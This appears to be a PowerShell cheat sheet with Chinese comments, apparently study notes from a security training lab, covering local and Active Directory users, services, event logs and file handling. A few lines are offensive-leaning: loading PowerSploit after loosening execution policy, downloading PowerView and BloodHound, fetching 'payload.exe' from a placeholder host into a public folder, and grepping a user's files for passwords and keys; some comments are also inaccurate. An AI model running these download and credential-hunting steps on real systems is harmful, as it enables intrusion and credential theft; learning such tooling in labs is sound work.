# windows系统查看版本
Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber
# 搜索和service相关的命令，在命令行里，get-help是查看帮助文档的命令,相当于linux的man
Get-Help *-Service

# 查看当前目录，相当于pwd
Get-Location
# 查看子目录
Get-ChildItem
# 切换目录
Set-Location
# 读文件
Get-Content Readme.md

# 查看powershell的命令的详细信息， -verb 参数可以筛选动词, -noun 参数可以筛选名词
Get-Command -Verb 
# 查看powershell命令历史
Get-History
# 查看历史命令
get-content C:\Users\DLarusso\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# 获或者取 PSReadLine 历史目录
$historyDir = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine"
# 列出目录下文件，查看历史记录
Get-ChildItem $historyDir

# 查看缩写
 Get-Alias
# 修改缩写,ft缩写做成table，fl做成map
 Set-Alias -Name gh -Value Get-Help

# 导入当前目录下的所有模块，排除Tests和docs目录
 Get-ChildItem $PSScriptRoot | ? { $_.PSIsContainer -and !('Tests','docs' -contains $_.Name) } | % { Import-Module $_.FullName -DisableNameChecking }
# 查看已导入的模块
 Get-Module -ListAvailable
# 查看执行策略
 Get-ExecutionPolicy 
# 修改执行策略为undefined，解除限制
 Set-ExecutionPolicy undefined
# 解除限制后，批量导入
Import-Module .\PowerSploit.psd1

# 非永久性导入
Set-ExecutionPolicy -Scope Process

# 查看命令
Get-Command -Module PowerSploit
# powershellget是用来管理powershell模块的
Get-Command -Module PowerShellGet
# admintoolbox是一个常用的模块，用于域控
Find-Module -Name AdminToolbox

# 安装admintoolbox模块
Find-Module -Name AdminToolbox|Install-Module

# 会在我们的主机上显示用户。这些用户只能访问该主机。
Get-LocalUser

# 创建本地用户
New-LocalUser -Name "JLawrence" -NoPassword
# 创建密码
$Password = Read-Host -AsSecureString "Enter Password"
# 推送密码
Set-LocalUser -Name "JLawrence" -Password $Password -Description "CEO EagleFang"
# 添加本地用户组
 Add-LocalGroupMember -Group "Remote Desktop Users" -Member "JLawrence"
 Get-LocalGroupMember -Name "Remote Desktop Users" # 查看

# 安装域控RSAT工具
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
# 查看已安装的ActiveDirectory模块
Get-Module -Name ActiveDirectory -ListAvailable

# RAST工具包, 查看域用户
Import-Module ActiveDirectory 
Get-ADUser -Filter {GivenName -like 'robert'}
Get-ADUser -Filter *
# 查看指定用户信息
Get-ADUser -Identity TSilver
# 通过邮箱域名筛选用户
Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}

# 添加新AD用户
New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true 
# 更改AD用户信息
Set-ADUser -Identity MTanaka -Description " Sensei to Security Analyst's Rocky, Colt, and Tum-Tum"

# 创建内容
Add-Content .\Readme.md "Title: Insert Document Title Here
>> Date: x/x/202x
>> Author: MTanaka
>> Version: 0.1 (Draft)"

# 重命名
 Rename-Item .\Cyber-Sec-draft.md -NewName Infosec-SOP-draft.md
# 批量修改
get-childitem -Path *.txt | rename-item -NewName {$_.name -replace ".txt",".md"}

# 查看管理员obejct的属性，所有的
Get-LocalUser administrator | get-member
# 通过get-obejct查看属性
Get-LocalUser administrator | Select-Object -Property *

# 按照启用状态分组显示本地用户，group-object用于分组
Get-LocalUser * | Sort-Object -Property Name | Group-Object -property Enabled

# 查看Windows Defender服务状态，查找的是object，where是Get-ChildItem的alias
Get-Service | where DisplayName -like '*Defender*'
# 查找指定目录下的所有txt文件，-ErrorAction SilentlyContinue用于忽略错误信息，和linux的2>/dev/null类似，将stderr重定向到null
Get-ChildItem -Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt")}
# 使用多条件or查找多种文件类型
Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")}
# 查找文件内的字符串，sls是select-string的alias，默认是不区分大小写的
Get-ChildItem -Path C:\Users\MTanaka\ -Filter "*.txt" -Recurse -File | sls "Password","credential","key"

# 查服务，ft是format-table的缩写，过滤显示指定字段
Get-Service | ft DisplayName,Status
# 启动 mdefend 服务
Start-Service WinDefend
# 停止
Stop-Service Spooler

# 查找到服务后，修改属性
get-service spooler | Select-Object -Property Name, StartType, Status, DisplayName
Set-Service -Name Spooler -StartType Disabled

# 远程查看另一台主机的服务状态
get-service -ComputerName ACADEMY-ICL-DC| Where-Object {$_.Status -eq "Running"}

# 远程命令，通过Invoke-Command，执行远程命令，scriptblock里写命令
invoke-command -ComputerName ACADEMY-ICL-DC,LOCALHOST -ScriptBlock {Get-Service -Name 'windefend'}

# 查看日志powershell中
Get-WinEvent -ListLog *
Get-WinEvent -ListLog Security # 指定日志名字为安全日志
# 展开查看最近5条安全日志的详细信息, -MaxEvents 是指定最大事件数，Select-Object -ExpandProperty Message是展开消息属性
Get-WinEvent -LogName 'Security' -MaxEvents 5 | Select-Object -ExpandProperty Message
# 过滤查看事件ID为4625（失败登录事件）
Get-WinEvent -FilterHashTable @{LogName='Security';ID='4625 '}
# 检查系统日志中的严重错误(Level=1)
Get-WinEvent -FilterHashTable @{LogName='System';Level='1'} | select-object -ExpandProperty Message

# 查看invoke-webrequest的属性和方法
Invoke-WebRequest -Uri "https://xx.com" -Method GET | Get-Member
Invoke-WebRequest -Uri "https://xx.com" -Method GET  -Method GET | fl Images # 查看图片信息
Invoke-WebRequest -Uri "https://xx.com" -Method GET  -Method GET | fl RawContent # 查看原始内容
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1" # 下载文件

# Net.WebClient 类似于Invoke-WebRequest,但更轻量级,下载文件
$client = New-Object Net.WebClient
$client.DownloadFile("https://xx.com/payload.exe","C:\Users\Public\payload.exe")
# or写一起
(New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")

# 快速创建模块清单文件
New-ModuleManifest -Path C:\Users\MTanaka\Documents\WindowsPowerShell\Modules\quick-recon\quick-recon.psd1 -PassThru